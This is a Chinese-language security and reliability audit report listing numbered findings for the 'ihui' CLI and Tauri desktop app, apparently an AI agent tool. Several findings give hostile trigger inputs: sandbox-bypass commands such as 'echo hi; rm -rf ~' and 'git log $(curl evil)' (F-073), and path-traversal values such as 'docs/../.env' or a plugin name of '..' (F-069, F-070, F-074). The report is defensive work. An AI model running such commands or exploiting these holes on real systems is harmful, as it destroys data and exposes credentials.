- **影响面**：F-045/F-047/F-061 这类配置回归永久静默，红灯无人知。
- **建议修法**：收进 `all-checks-runner` 或 guardian 注册表。
- **是否当场可修**：是。

### F-041 artifact 收敛钩子把"没有产物"判绿

- **严重度**：P2
- **文件与行号**：`scripts/desktop-artifact-single.mjs:126,137-143`
- **触发路径**：`tauri build --no-bundle`；或 `--config` 改了 version/productName。
- **根因**：钩子只管多版本清理，缺包直接 `return 0`；期望文件名硬编码且 version 取 base `tauri.conf`，忽略 `--config`。
- **证据**：`if (!existsSync(nsisDir)) return 0`；`if (!keep.includes(exeName)) { … return 0 }`。
- **影响面**：无安装包或旧包残留仍判通过；发布侧拿到假绿。
- **建议修法**：加 `--expect`，由 `desktop-build` 传实际 config 的 productName+version；缺产物 exit 1。
- **是否当场可修**：是。

### F-048 托盘创建失败时 `close_behavior=hide` 把窗口藏进虚空

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/desktop_prefs.rs:211-215`；`apps/desktop/src-tauri/src/lib.rs:3752-3754,4020-4025`
- **触发路径**：`show_tray_icon=true` 但 `build_tray` 失败，用户点关闭。
- **根因**：`Hide` 分支不看 `tray_present`（`Ask` 分支看了）；文档注释承诺"退化成退出"但未实现。
- **证据**：本次已复核 `desktop_prefs.rs:214 CloseBehavior::Hide => CloseDecision::Hide,`。
- **影响面**：进程常驻、无窗口无托盘，用户以为已退出/卡死。
- **建议修法**：`Hide && !tray_present` 时改判 `Quit`。
- **是否当场可修**：是。

### F-049 `set_caption_button_theme` 未进命令清单/能力，暗色下原生窗控不可读

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/build.rs:18-103`；`apps/desktop/src-tauri/src/lib.rs:4177`；`apps/desktop/src/tauri-bridge.ts:290-293`（前端，基线外）
- **触发路径**：应用内切暗色，前端上报顶栏底色。
- **根因**：命令不在 `AppManifest.commands` 也不在 capabilities ⇒ 远程 invoke "not allowed"；前端 catch 静默吞。
- **证据**：86 条清单中无 `set_caption_button_theme`。
- **影响面**：深底仍画深色字，按钮不可读且无日志。
- **建议修法**：`build.rs` 与 `default.json` 同步补该命令。
- **是否当场可修**：是。

### F-050 清理旧实例只杀主进程，不杀 WebView2 子进程

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/startup_guard.rs:413-415,549,648`
- **触发路径**：启动清理挂死实例；或强制退出后立刻再启动。
- **根因**：仅 `TerminateProcess` 同路径主进程，无 Job Object / `taskkill /T`；`msedgewebview2` 残留占 `EBWebView` Lockfile，等锁上限 `120_000`。
- **证据**：`TerminateProcess(h, 1)`。
- **影响面**：下次启动最长 120s 无窗口（"双击没反应"）。
- **建议修法**：子进程入 Job Object，或 `taskkill /T /PID` 后再等锁。
- **是否当场可修**：是。

### F-051 第二次双击会杀掉仍在启动的合法首实例

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/startup_guard.rs:159-163,468-490`
- **触发路径**：首实例启动超 10s（慢机或等锁）时用户再双击。
- **根因**：等 10s 后丢弃"启动相位"旗重判，此时首实例无窗口即落 `KillStaleThenContinue`。
- **证据**：`decide(true, …, sample.has_visible_window, false)`。
- **影响面**：反复双击 → 实例互相终止，始终打不开。
- **建议修法**：重判保留相位旗，或等待上限覆盖 120s。
- **是否当场可修**：是。

### F-054 脚本超时只放弃结果，不杀 powershell（线程 + 进程双泄漏）

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/checkin_capture.rs:2701-2731`
- **触发路径**：`checkin_audit_trae_residual` → audit_probe_registry/hardware/sqm 每次派生 powershell。
- **根因**：超时仅 drop 接收端，工作线程仍卡在 `cmd.output()`，子进程无人 kill；注释以"随宿主退出回收"兜底。
- **证据**：`std::thread::spawn(move || { … let _ = tx.send(cmd.output()); });`。
- **影响面**：每次超时残留一个 `powershell.exe` + 线程；反复点审计线性累积。
- **建议修法**：照 `git_local_status.rs:194-274` 改 spawn + `try_wait` 轮询 + kill/wait。
- **是否当场可修**：是。

### F-055 全盘索引走同步命令，阻塞主线程

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/git_channel_ipc.rs:491-505`；`apps/desktop/src-tauri/src/workspace_index.rs:95-189`
- **触发路径**：调用 workspace 索引，上限 5 万条 `read_dir`+`metadata` 全同步。
- **根因**：非 async 命令直接 `walk_index`；同仓 `checkin_capture.rs:3498-3503`、`minimax_reset.rs:1148` 都已用 `spawn_blocking`。
- **证据**：`pub fn workspace_index_scan(…) { … let walk = walk_index(Path::new(&root));`。
- **影响面**：大仓秒级冻结全部窗口，且无法取消。
- **建议修法**：`#[tauri::command(async)]` + `spawn_blocking`。
- **是否当场可修**：是。

### F-056 书签/历史非原子写，损坏即整份归零

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/browser_bookmarks.rs:208-239,313-341`
- **触发路径**：每次导航 `embedded_browser_record_history` 全量覆盖。
- **根因**：直接 `fs::write`；解析失败回退 `BrowserData::default()`，下一次写把坏文件覆盖，静默全丢。同仓 `browser_store.rs:85-100` 已有 tmp+rename 先例。
- **证据**：`std::fs::write(path, bytes)`；`Err(e) => { … BrowserData::default() }`。
- **影响面**：强杀/断电/磁盘满时收藏与历史永久消失。
- **建议修法**：tmp+rename（+fsync），坏档留 `.bak`。
- **是否当场可修**：是。

### F-057 快照备份递归跟随 junction，越界拷贝/成环

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/checkin_capture.rs:2947-2959,2963-2970,2994-3005`
- **触发路径**：`checkin_snapshot_backup` 拷 Network/aha/Partitions 等目录。
- **根因**：`sp.is_dir()` 跟随重解析点，无 `canonicalize` 断言、无深度/访问集上限。
- **证据**：`if sp.is_dir() { copy_dir_recursive(&sp, &dp)?; }`。
- **影响面**：TRAE 目录内 junction 指向库外 ⇒ 整棵外部树读进 app_data（磁盘爆/泄密）；成环则栈溢出 abort。
- **建议修法**：用 `symlink_metadata().file_type()` 判链接跳过（`workspace_index.rs:71-81` 已有先例）+ 深度上限。
- **是否当场可修**：是。

### F-058 三处 `.output()` 无超时无 kill

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/src/checkin_capture.rs:465-468,3210-3213,3822-3828`
- **触发路径**：JWT 捕获（DPAPI 兜底）、重置（MachineGuid）、Qoder `runtime-info.exe`。
- **根因**：同步命令内无界阻塞，脚本/第三方 exe 挂起即命令线程永久占用。
- **证据**：`std::process::Command::new("powershell")…output()`；`cmd.output()`。
- **影响面**：捕获/重置按钮永久转圈，不可取消。
- **建议修法**：统一走"超时 + kill"封装。
- **是否当场可修**：是。

### F-061 `allow-clipboard-set` 两端皆无

- **严重度**：P2
- **文件与行号**：`apps/desktop/src-tauri/capabilities/local-fs-io.json:6-13`；`apps/desktop/src-tauri/capabilities/default.json:9-79`
- **触发路径**：remote 页 agent-control 粘贴。
- **根因**：DBG-38 迁 `clipboard-get` 时漏掉 `clipboard-set`；`build.rs:47` 已注册 `clipboard_set`。
- **证据**：本次已复核两个 capability 文件，均无 `allow-clipboard-set`。
- **影响面**：粘贴被 ACL 拒（若 `tests/capabilities-fs-remote-denied.test.mjs:48` 已断言必含，则回归钉本应红，见 F-040）。
- **建议修法**：在 `default.json` 补 `allow-clipboard-set`（写剪贴板非窃取面）。
- **是否当场可修**：是。

---

## 四、P3

### F-017 非法数值/枚举静默回落

- **严重度**：P3
- **文件与行号**：`apps/cli/src/index.ts:1072,1163,1202,1265-1270,1339-1340`；`apps/cli/src/headless-format.ts:170-173`
- **触发路径**：`undo abc`、`undo 0`、`--limit abc`、`--output-format jsn`、`share -f txt`。
- **根因**：`Number(x) || 1`、`parseInt` 后静默取默认、`as` 强转。
- **证据**：`const steps = Number(stepsArg) || 1;`。
- **影响面**：用户意图被替换却不报错（`undo 0` 反而撤 1 步）。
- **建议修法**：严格校验，非法即 usage + exit 2。
- **是否当场可修**：是。

### F-018 全局 flag 位置敏感 + `json` 判据双源

- **严重度**：P3
- **文件与行号**：`apps/cli/src/index.ts:203,311-312,1118`；`apps/cli/src/commands/security.ts:263`；`apps/cli/src/commands/share.ts:224-235`
- **触发路径**：`ihui --json security audit`、`ihui security audit --json`、`ihui undo --json`。
- **根因**：全局 `--json` 与子命令同名选项各自为政；`jsonMode` 一处用 `!isTTY`、一处用 `opts.json === true`。
- **证据**：`opts.json === true || !process.stdout.isTTY` vs `if (program.opts().json === true)`。
- **影响面**：同一 flag 换位置行为不同，脚本不可移植。
- **建议修法**：统一 `optsWithGlobals()` + 单一 `jsonMode` 出口。
- **是否当场可修**：是。

### F-034 `saveSession` 无 CAS/锁，整份覆写丢并发更新

- **严重度**：P3
- **文件与行号**：`apps/cli/src/sessions/state-store.ts:164-172,201`
- **触发路径**：两实例先后 load→save 同一会话；或同毫秒 patch。
- **根因**：只对 `updatedAt` 做单调合并，其余列整份以调用方为准；`patchSession` 以 `updatedAt` 字符串为令牌，同毫秒双写均通过。
- **证据**：`const next = { ...state, updatedAt: monotonicUpdatedAt(...) }`；`if (expected !== undefined && current.updatedAt !== expected) return null`。
- **影响面**：后写者把先写者新增消息/列覆盖回旧快照，双方都返回成功。
- **建议修法**：会话级锁文件或内容哈希 CAS。
- **是否当场可修**：否（需改契约）。

### F-035 update-check 缓存非原子，损坏后永久拒写

- **严重度**：P3
- **文件与行号**：`apps/cli/src/updater.ts:174-190`
- **触发路径**：写 `~/.ihui/.update-check.json` 时崩溃；或文件被写坏。
- **根因**：裸 `writeFileSync`；读侧解析失败抛错，`mergeWriteCache` 只 warn 后 `return`，永不修复；read-modify-write 还会丢另一方键。
- **证据**：`fs.writeFileSync(cacheFile, JSON.stringify({ ...base, ...patch }))`；`process.stderr.write(...); return;`。
- **影响面**：每次启动刷警告且 latest/minGate 结论永不更新（只能手删文件）。
- **建议修法**：写入走原子出口；损坏件改名隔离后重建。
- **是否当场可修**：是。

### F-039 审计文件/目录未收紧权限

- **严重度**：P3
- **文件与行号**：`apps/cli/src/audit.ts:90,99`
- **触发路径**：任意工具调用后追加日志。
- **根因**：`appendFileSync`/`mkdir` 均无 mode，默认受 umask → 0644/0755。
- **证据**：同上。
- **影响面**：同机其他用户可读审计内容（与 F-006 叠加时含未脱敏参数）。
- **建议修法**：文件 0600、目录 0700。
- **是否当场可修**：是。

### F-042 未签名临时 config 单格并发互删，清理失败不改退出码

- **严重度**：P3
- **文件与行号**：`scripts/desktop-build.mjs:64,396-400`
- **触发路径**：同机并发两次构建。
- **根因**：`UNSIGNED_SLOT = 'desktop-build'` 固定且 `finally` 无条件删；清理失败只 `console.error`。
- **证据**：同上。
- **影响面**：后启动的 tauri 读到已被删的 `--config` 路径而失败；残留不报红。
- **建议修法**：slot 带 pid 或加锁；清理失败计入退出码。
- **是否当场可修**：是。

### F-043 dev 配置漂移：`csp:null`、版本 0.1.53、9333 CDP

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/tauri.localdev-cdp.json:4,36,40`；`tauri.cdp.json:27`；`apps/desktop/package.json:9`
- **触发路径**：`-- --config src-tauri/tauri.localdev-cdp.json`。
- **根因**：该文件无脚本引用却被保留并显式关 CSP，版本停留在 0.1.53，开固定 CDP 端口。
- **证据**：`"version":"0.1.53"`；`"csp":null`；`--remote-debugging-port=9333`。
- **影响面**：一旦选中：本地页无 CSP、包版本/更新通道错位、本机进程可挂 CDP 驱动全 IPC 窗口。
- **建议修法**：删死文件，或同步 version/csp 并加"dev 配置不得 csp:null/CDP"断言。
- **是否当场可修**：是。

### F-044 shell open 运行时正则放行任意 localhost 端口

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/tauri.conf.json:54`
- **触发路径**：线上页 XSS 调 `plugin:shell|open`。
- **根因**：声明面只到 8801，运行时正则写成 `\d+`。
- **证据**：`^http://localhost(:\d+)?(/.*)?$` vs `default.json:45` 的 `http://localhost:8801/*`。
- **影响面**：可调起本机任意端口 HTTP（钓鱼 / CSRF GET）。
- **建议修法**：收紧为 `localhost:8801`，测试补非 8801 用例。
- **是否当场可修**：是。

### F-052 第二实例/深链唤起不还原最小化窗口

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:2764-2765,3711-3714`
- **触发路径**：主窗口最小化后双击图标或用 `ihui://` 唤起。
- **根因**：只 `show()+set_focus()`，Windows 下不会 unminimize。
- **证据**：`let _ = window.show(); let _ = window.set_focus();`。
- **影响面**：用户以为没响应，仅任务栏闪烁。
- **建议修法**：`is_minimized()` 时先 `unminimize()`。
- **是否当场可修**：是。

### F-059 快照落地先删后换，失败即旧快照已毁

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/checkin_capture.rs:3010-3016`
- **触发路径**：快照替换时 rename 失败（AV 占用/跨卷/权限）。
- **根因**：`remove_dir_all(&profile_dir)?;` 后才 `rename(&tmp_dir, &profile_dir)`；失败时旧快照已销毁，新快照留在 `.checkin-tmp-<pid>` 成孤儿。
- **证据**：同上。
- **影响面**：快照整体丢失且留下垃圾目录。
- **建议修法**：旧目录先改名 `.bak` → rename tmp → 成功后删 `.bak`，失败回滚。
- **是否当场可修**：是。

### F-060 Cookie 整串经 IPC 回传前端 + `expect` 建客户端

- **严重度**：P3
- **文件与行号**：`apps/desktop/src-tauri/src/checkin_web_login.rs:219-223,228-236`
- **触发路径**：Web 登录探测成功后返回前端。
- **根因**：返回结构含完整 `cookie: String`；`reqwest::Client::builder()…expect("reqwest client build")`。
- **证据**：`Ok { cookie: String, accounts: ... }`。
- **影响面**：会话凭据进入 webview JS 内存（可能被持久化）；服务端侧 `probe_cookie_accounts` 已能完成同一验证，回传非必需。
- **建议修法**：只回 uid/nickname/布尔，cookie 留 Rust；`expect` 改 `map_err`。
- **是否当场可修**：是（需同步 web 契约）。

---

## 五、未判定清单

| ID | 事项 | 为什么未判定 | 需要什么才能判定 |
|---|---|---|---|
| U-01 | `process.exit` 是否真的截断 stdout（F-010） | 代码推断；需构建 CLI 在真实管道下复现 | 构建 `dist` 后 `ihui … \| cat` 对比输出完整性 |
| U-02 | `--args=a b` 与 `--args a b` 的差异 | 仅据 commander 源码推断 | 实跑两种写法 |
| U-03 | acp 的 SIGINT/SIGTERM 只 `connection.close()`（`index.ts:1044-1045`）能否真正终止进程 | 无退出码处理，但未实测 | 起 ACP 会话发信号观察 |
| U-04 | `worktree` 是否存在独立 CLI 入口 | `index.ts` 无子命令注册，`worktree.ts` 疑似工具模块 | 追 `bin` 入口与动态导入 |
| U-05 | web 侧是否已切到 `store_read_entry/store_write_entry` | 桌面前端 `apps/desktop/src` 不在基线内（本地未跟踪） | 取到前端源码后确认 F-045 的第二半 |
| U-06 | Windows 上 `chmodSync` no-op 是否算"假绿"（F-005/F-028 叠加） | 属产品口径问题，代码事实已确认 | 产品确认威胁模型 |
| U-07 | `copyFileSync` 在 ENOSPC/跨设备下的半截行为 | 只静态判为非原子 | 故障注入实测 |
| U-08 | `plugins/cache.ts`、`worker-pool.ts` 的写盘面 | 未逐行读完 | 单列一轮 |
| U-09 | `git_merge`/`git_rebase` 无 `-m` 且 env 无 `GIT_EDITOR` 时是失败还是挂起 | 未实测 | 需构造冲突场景 |
| U-10 | `worktree.ts:69-70` 用 `resolve` 而非 `realpath` 在符号链接工作区下是否漂移 | 未追到消费端 | 构造 symlink 工作区实测 |
| U-11 | Windows 批处理以 UTF-8 写入 + 第 2 行才 `chcp 65001`，含中文 commandLine 是否乱码 / `%VAR%` 二次展开 | 未取证 | 构造中文路径实测 |
| U-12 | CSP 是否作用于 remote 主窗口 | Tauri 通常只对本地协议注入，仓内无实现/测试可证 | 起真实包抓响应头 |
| U-13 | `embedded_browser_*` / `dialog:default` / `updater:default` 在 remote 页的真实越权面 | 未见 Rust 侧参数约束证据 | 逐命令核对入参 |
| U-14 | OAuth 回调/设备码 token 是否落临时目录 | 已排除 IP 白名单外情形，但未逐路径核对 | 全链路走查 |
| U-15 | `audit-ingest-client.ts` 上报载荷字段 | 未逐字段核对 | 抓包 |
| U-16 | `apps/desktop/src`（前端）整体 | 不在基线内 | 纳入后单独普查 |
| U-17 | qoder/workbuddy 隔离区恢复是否同样信任 `manifest.root` | 仅确认到目录名前缀校验，未追完是否可越界写 | 逐函数追 |
| U-18 | checkin_capture 内嵌 `cmd /c vol` 是否存在外部拼接 | 目前看是常量脚本 | 追调用点 |

---

## 六、与计划去重记录

- `PROJECT_PLAN.md` 命中但**不同题**（不重复计入新增）：spawnSync EBUSY/stdio 约定（约 3940 行、5157 行）、windowsHide 弹窗（113-181 行）、taskkill 只杀 shell 会重生（316 行）、terminal_send 绕过门禁（31641 行）、bat 注释 GBK（124 行）、原子写出口 BUG-0010、单调钟/列所有权 G-820、manifest 损坏隔离 G-671、门 122 原子写守门、git_channel_ipc/workspace_index 的 ACL 与孤儿模块（31711-31712 行）、命令表缺项与 app_data 路径（31711、31713 行）、"目录缺失 return 0"家族（31729 行）、mcp.json 明文+argv（31432 行④）、MCP chmodSafe（4346 行）、manifest 原子写 DBG-42（31507 行）。
- `scripts/data/plan-fields.jsonl`：对本轮全部关键词 0 命中，仅 `Y-14` 与前一轮弱相关。
- 结论：本轮 **61 条** 均为新增（含 2 条"既有修复仍为假绿"的残余：F-045、F-061）。

---

## 七、覆盖清单（第 1 轮）

**CLI**
- 入口/参数：`index.ts`、`config/cli.ts`、`commands/{serve,agent,repl,session,config-cmd,mcp-config,plan,tasks,undo-redo,template,share,login,import,report,security,checkpoint,trash}`、`headless-*`、`crash-handler.ts`、`min-version-probe.ts`
- 子进程/git/编码：`tools/{terminal,sandbox/**,git,git-shared,git-advanced,ripgrep-bin,run-tests,background-registry,background-ledger}`、`util/{spawn-isolated,parent-bound,close-event}`、`plugins/git-runner.ts`、`tools/worktree*`
- 状态/并发：`util/atomic-write.ts`、`sessions/*`、`checkpoints/*`、`subagents/{state-store,worker-pool,worker-entry}`、`prompt-queue.ts`、`turn-reservation.ts`、`util/inflight-ledger.ts`、`plugins/cache.ts`、`skills/catalog-cache-store.ts`、`updater.ts`、`compaction-cache.ts`
- 凭据/日志：`config/{credentials,env,index,merge}`、`lib/{private-file,auth-refresh,device-fingerprint,sso,registry-client}`、`tools/{mcp-credentials,mcp-oauth,mcp-runtime}`、`redact.ts`、`security/*`、`audit.ts`、`telemetry/*`、`commands/{login,token-manager}`

**Desktop**
- Rust 核心：`lib.rs`（事件循环/窗口/单实例/深链/托盘/更新/IPC 注册）、`main.rs`、`startup_guard.rs`、`window_chrome.rs`、`auto_refresh.rs`、`store_path.rs`、`log_retention.rs`
- Rust 业务：`embedded_browser.rs`、`browser_{bookmarks,settings,store}.rs`、`checkin_capture.rs`、`checkin_web_login.rs`、`{minimax,qoder,workbuddy}_reset.rs`、`operator.rs`、`desktop_prefs.rs`、`egress_gate.rs`、`git_*.rs`、`workspace_index.rs`
- 配置/能力/构建：`tauri*.json`、`capabilities/*.json`、`permissions/autogenerated/*.toml`、`build.rs`、`Cargo.toml`、`scripts/desktop-*.mjs`、`scripts/lib/*.mjs`、`offline/`、`shell/`

## 八、第 2 轮发现（续编号，5 个方向并行）

### P1

### F-062 WS 连接未挂 `error` 监听，单帧即可崩掉 serve 进程

- **严重度**：P1
- **文件与行号**：`apps/cli/src/server/ws-bridge.ts:104-165`（接口声明 50、构造 101、注册 159/162）
- **触发路径**：握手后发送超 `maxPayload`（默认 100 MiB）帧、非法帧，或底层 ECONNRESET。
- **根因**：连接只注册 `message`(159) 与 `close`(162)，声明的 `on('error')` 从未注册；`new WsServer({server,path})` 也未设 `maxPayload` ⇒ EventEmitter 无监听的 `error` 抛到 `uncaughtException`。
- **证据**：本次已复核 150-165 行，确认只有 message/close 两个监听。
- **影响面**：整台 `ihui serve` 退出，全部会话中断；攻击面在鉴权之前即可触发。
- **建议修法**：注册 `ws.on('error')`，显式设 `maxPayload`，错误即 `close(1009)`。
- **是否当场可修**：是。

### F-069 插件清单 `name` 未校验 → 安装落点逃逸，可整目录替换 `~/.ihui`

- **严重度**：P1
- **文件与行号**：`apps/cli/src/plugins/installer.ts:484,847,1065`；`apps/cli/src/plugins/paths.ts:60-61`；`apps/cli/src/plugins/manifest-scan.ts:88`
- **触发路径**：`/plugin install`（本地/git/市场）时 `plugin.json` 写 `"name":".."` 或 `"../../Documents"`。
- **根因**：`readPluginManifest` 只判 `typeof name === 'string' && length > 0`（本次已复核 484 行）；`isValidManifest` 同口径；`getPluginInstallPath` 直接 `path.join(installedPluginsDir, name)`（本次已复核 60-61 行）；只有**源路径**过 `inspectLocalPathSafety`，**目标路径**零校验。
- **证据**：`const dest = getPluginInstallPath(manifest.name);`（847）；实测 `name=".."` → `C:\Users\<u>\.ihui`，`name="../../Documents"` → `…\Documents`；`cache.ts:872-960` 的 `takeOwnershipOfTarget` 会先把目标改名为 `.superseded-*` 再落插件目录。
- **影响面**：`~/.ihui`（含 registry、信任库、全部插件与数据）被整目录替换/删除；属于"装一个插件毁掉整个 CLI 状态"级别。
- **建议修法**：新增唯一 `assertSafePluginName`（`/^[a-z0-9][a-z0-9._-]{0,63}$/i`，禁 `.`/`..`/分隔符），三处派生点统一调用；落位前对 dest 做 `realpath` 二次包含校验。
- **是否当场可修**：是。

### F-070 卸载 `name` 零校验 → 递归删除逃逸

- **严重度**：P1
- **文件与行号**：`apps/cli/src/commands/plugin-marketplace.ts:79-84`；`apps/cli/src/plugins/installer.ts:1245-1259`
- **触发路径**：`plugin uninstall ..` / `../../Documents`。
- **根因**：命令层仅判 `!name`；`uninstallPlugin` 用原始串拼路径后 `fs.rmSync(…, {recursive:true, force:true})`，无主键校验、无根包含断言。
- **证据**：`getPluginInstallPath(name)` → `rmSync(...)`。
- **影响面**：一次误输入或脚本传参即递归删除家目录级路径，且 `force:true` 不报错。
- **建议修法**：同 F-069 的前置校验；卸载前确认 registry 里有该记录且路径在 `getInstalledPluginsDir()` 内。
- **是否当场可修**：是。

### F-073 沙箱命令白名单只看首个 token，shell 元字符直接放行

- **严重度**：P1
- **文件与行号**：`apps/cli/src/sandbox/index.ts:393-414,451-464,972,1120`
- **触发路径**：默认 `limited` 档执行 `git status && del x`、`echo hi; rm -rf ~`、`git log $(curl evil)`。
- **根因**：`extractCommandName` 只按空白/引号截首个 token（本次已复核 393-414），白名单校验的是命令名前缀，不校验 argv 结构；已写好的 `tokenizer` 未接入；执行端 `spawnSync(..., { shell: true })`（本次已复核 972、1120）由 shell 解释整串。
- **证据**：`firstToken` → `path.basename` → 查白名单；`shell: true` ×2。
- **影响面**：默认档等于任意命令执行，白名单形同虚设。
- **建议修法**：接入 `tokenizeCommand`，拒绝多段命令/重定向/命令替换；执行改 `shell:false` + argv。
- **是否当场可修**：是。

### F-074 文件访问 ACL 可被 `..` / 绝对路径 / 软链绕过

- **严重度**：P1
- **文件与行号**：`apps/cli/src/sandbox/file-access-policy.ts:68-97,329-341,502-508`；`apps/cli/src/sandbox/glob-pattern.ts:21-23`；`apps/cli/src/sandbox/builtins.ts:654-661`；`apps/cli/src/tools/file-edit.ts:122-124`
- **触发路径**：`read_file path="docs/../.env"`，或越界绝对路径。
- **根因**：ACL 用**未解析**路径跑 glob 匹配（不命中即不拦），随后 `resolvePath` 却折叠 `..` 读到真文件；无 `realpath`；`.env`/`.env.*` 规则没有 `**/` 变体。
- **证据**：`glob-pattern.ts:21-23` 仅换 `\`、去 `./`；`file-access-policy.ts:334-336` 直接匹配。
- **影响面**：工作区内/外的凭据读取拦截整体失效。
- **建议修法**：匹配前 `resolve`+`realpath`；补 `**/.env*`；越界绝对路径直接拒。
- **是否当场可修**：是。

### F-075 出口策略 `unjudged` 一律不拦（fail-open）

- **严重度**：P1
- **文件与行号**：`apps/cli/src/sandbox/egress/env-inject.ts:131-151,196-205`；`apps/cli/src/sandbox/egress/dns-adjudicator.ts:167-210,229-238`
- **触发路径**：`ENFORCE=1` + `ADDRESS_PROOF=1` 时 DNS 失败/抛错/冷缓存/参数变量化。
- **根因**：blocking 只收 `deny ∧ enforce`，"判不了"降级为 warning，未进 blocked。
- **证据**：`149-151` 仅筛 `deny`+`enforce`；`168-190` 四类失败全落 `unjudged`；`144` 冷缓存只 prewarm。
- **影响面**：内网/恶意域拒绝可被 DNS 故障稳定绕过。
- **建议修法**：要求地址证据时 `unjudged` 即阻断，或默认 deny。
- **是否当场可修**：是。

### F-080 `write_text_file` 无大小上限、非原子覆盖

- **严重度**：P1
- **文件与行号**：`apps/desktop/src-tauri/src/lib.rs:1578-1591`
- **触发路径**：远程页 XSS 后 `invoke("write_text_file", { path, content })`（该命令已在 capability 开放）。
- **根因**：`content: String` 无长度检查；`std::fs::write` 先截断后写，无 tmp+rename；读侧有 `MAX_TEXT_FILE_SIZE`（1537/1556），写侧没有对应常量。
- **证据**：本次已复核 1585-1590：`ensure_in_app_data` → `create_dir_all` → `std::fs::write(&path, content)`。
- **影响面**：app_data 内任意文件（`ihui-chat` 信封、`window-state.json`）可被截成 0 字节/半截；可写满磁盘。
- **建议修法**：加 `MAX_WRITE_SIZE`；同目录 `*.tmp` + `fs::rename` 原子替换。
- **是否当场可修**：是。

### F-087 LSP initialize 失败后不回收子进程

- **严重度**：P1
- **文件与行号**：`apps/cli/src/tools/lsp.ts:335-341,378-382,400-405`
- **触发路径**：language server 不回 `initialize`（15s 超时）或 spawn error。
- **根因**：失败路径无 kill/dispose，`this.child` 被下一次 `start` 覆盖；`exit` 兜底只杀"当前" child，孤儿已失去引用。
- **证据**：`withTimeout(...)` 抛错，`start()` 全段无 try/catch。
- **影响面**：每次失败泄漏一个语言服务器进程 + 旧连接继续写 diagnostics；重试叠加，且每次 `start` 追加一个 `process` exit 监听。
- **建议修法**：catch 中 `child.kill()` + `conn.dispose()` 并清引用；exit 监听移到构造器或加一次性守卫。
- **是否当场可修**：是。

### F-088 长期记忆整文件重写无锁、非原子

- **严重度**：P1
- **文件与行号**：`apps/cli/src/memory/long-term.ts:33,62`；`apps/cli/src/memory/dream.ts:31-35`
- **触发路径**：dream 周期沉淀，或两 CLI 会话同 workspace 并发写 `MEMORY.md`；写盘中途崩溃。
- **根因**：read→拼行→`writeFileSync` 直写（本次已复核 62 行），无 tmp+rename、无锁、无去重/上限；dream 逐条 append 是 O(n²)，失败时 `clear()` 不执行。
- **证据**：`fs.writeFileSync(this.filePath, content, 'utf-8')`。
- **影响面**：崩溃截断 `MEMORY.md` ⇒ 后续 load 只解析到残段（静默丢记忆）；部分成功后再 dream 造成重复条目无限增长。
- **建议修法**：写临时文件 + rename；加文件锁/租约；dream 先快照成功后按条提交。
- **是否当场可修**：是。

### F-095 回收站恢复信任 manifest 的 `relativeTrashPath`/`originalPath`，仓库可控任意文件搬移

- **严重度**：P1
- **文件与行号**：`apps/cli/src/tools/file-batch-edit.ts:245,265-293`；校验函数在 `packages/shared/src/delete-guard/recycle.ts`（`relativeTrashPath`/`originalPath` 仅校验为 string）
- **触发路径**：克隆一个携带 `.ihui/delete-trash/<id>/manifest.json` 的仓库，再执行 `trash restore <originalPath>`。
- **根因**：`trashId` 有 `isSafeIdSegment` 校验，但 `entry.relativeTrashPath` 未做 `..`/绝对路径断言，`entry.originalPath` 也未做"必须在 workspace 内"断言；随后 `path.join(dir, entry.relativeTrashPath)` → `mkdirSync(dirname(originalPath))` → `renameSync/copyFileSync`。
- **证据**：本次已复核 267、289-293 行；`isTrashManifestShape` 只判字符串类型。
- **影响面**：可把 `~/.ssh/id_rsa`、`~/.ihui/auth.json` 等搬进工作区（外泄），或把任意文件搬到启动目录（持久化）；工作区内容本身是不可信输入。
- **建议修法**：`relativeTrashPath` 必须是单段安全文件名且 `realpath` 后仍在 trash 根内；`originalPath` 必须 `realpath` 后落在 workspace 内。
- **是否当场可修**：是。

### P2

### F-063 WS 断连不取消在飞回合、发送无背压

- **严重度**：P2
- **文件与行号**：`apps/cli/src/server/ws-bridge.ts:177-192`
- **触发路径**：关闭标签页/断网后回合仍跑；慢客户端持续收 token。
- **根因**：`core.sendMessage` 只传 `{sessionId}`，无 `AbortSignal`；`onEvent` 仅判 `readyState`，`ws.send` 不看 `bufferedAmount`；`void handleMessage` 无并发闸。
- **影响面**：断连后继续烧 token、继续写文件；缓冲无限增长。
- **建议修法**：按连接建 `AbortController`，close 时 abort；`bufferedAmount` 超阈值断开。
- **是否当场可修**：是。

### F-064 HTTP 请求体无上限、SSE 无背压、无显式超时

- **严重度**：P2
- **文件与行号**：`apps/cli/src/server/http-server.ts:179-181,212,254-273`
- **触发路径**：POST /message 巨型 body；客户端慢读 SSE。
- **根因**：`chunks` 无累计字节/Content-Length 校验，`Buffer.concat` 全量驻留；`res.write` 返回值丢弃；`listen` 未设 `requestTimeout`/`headersTimeout`。
- **影响面**：单个已鉴权 client 可在默认 300s 内打爆内存。
- **建议修法**：限 1 MB 返回 413；写返回 false 时暂停；设超时。
- **是否当场可修**：是。

### F-065 同会话并发回合共享消息数组，abort 相互覆盖

- **严重度**：P2
- **文件与行号**：`apps/cli/src/server/agent-core.ts:204-212,306-308`
- **触发路径**：两条同 sessionId 的 HTTP/WS 请求并发。
- **根因**：无 per-session 串行锁，`state.messages.push` 与 `runToolLoop` 并发改写；`state.abort = abort` 覆盖前一个，`cancel` 只中止最后一个。
- **影响面**：历史交叉污染、`saveSession` 覆盖；先跑回合不可取消。
- **建议修法**：按会话串行队列或拒绝并发（409）；abort 存集合。
- **是否当场可修**：是。

### F-066 ACP 会话关闭 / SIGINT 不中止在飞 prompt

- **严重度**：P2
- **文件与行号**：`apps/cli/src/acp/server.ts:979-981`；`apps/cli/src/index.ts:1044-1046`
- **触发路径**：`session/close` 或 Ctrl-C 时 prompt 仍在 `runToolLoop`。
- **根因**：`closeSession` 仅 `sessions.delete`，不 abort `pendingAbort`；SIGINT 仅 `connection.close()`，覆盖默认终止。
